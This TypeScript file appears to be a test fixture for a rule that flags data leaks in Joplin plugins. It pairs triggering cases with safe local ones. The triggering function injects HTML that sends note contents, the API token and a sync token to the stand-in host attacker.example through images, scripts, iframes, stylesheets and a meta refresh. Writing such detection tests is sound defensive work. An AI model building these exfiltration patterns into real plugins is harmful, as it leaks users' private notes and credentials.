import * as joplin from 'api';

async function triggerRule(panel: string, dialog: string, editor: string) {
    const note = await joplin.data.get(['notes', '1']);
    await joplin.views.panels.setHtml(
        panel,
        '<img src="https://attacker.example/pixel?' + note.body + '">',
    );

    const token = await joplin.settings.globalValue('api.token');
    await joplin.views.dialogs.setHtml(
        dialog,
        `<script src="https://attacker.example/${token}.js"></script>`,
    );

    await joplin.views.editors.setHtml(
        editor,
        '<iframe src="https://attacker.example/env?' + process.env.SYNC_TOKEN + '"></iframe>',
    );

    await joplin.views.panels.setHtml(
        panel,
        '<link href="https://attacker.example/theme.css?note=' + note.body + '" rel="stylesheet">',
    );

    await joplin.views.dialogs.setHtml(
        dialog,
        '<meta http-equiv="refresh" content="0;url=https://attacker.example/redirect?token=' + token + '">',
    );
}

async function safeCases(panel: string, dialog: string, editor: string) {
    const note = await joplin.data.get(['notes', '1']);
    const token = await joplin.settings.globalValue('api.token');

    await joplin.views.panels.setHtml(
        panel,
        '<img src="http://localhost:41184/pixel?' + note.body + '">',
    );

    await joplin.views.dialogs.setHtml(
        dialog,
        '<iframe src="http://127.0.0.1:41184/token?' + token + '"></iframe>',
    );

    await joplin.views.editors.setHtml(
        editor,
        '<img src="https://example.com/theme?' + process.env.THEME + '">',
    );

    await joplin.views.panels.setHtml(panel, '<p>Locally generated content</p>');
}
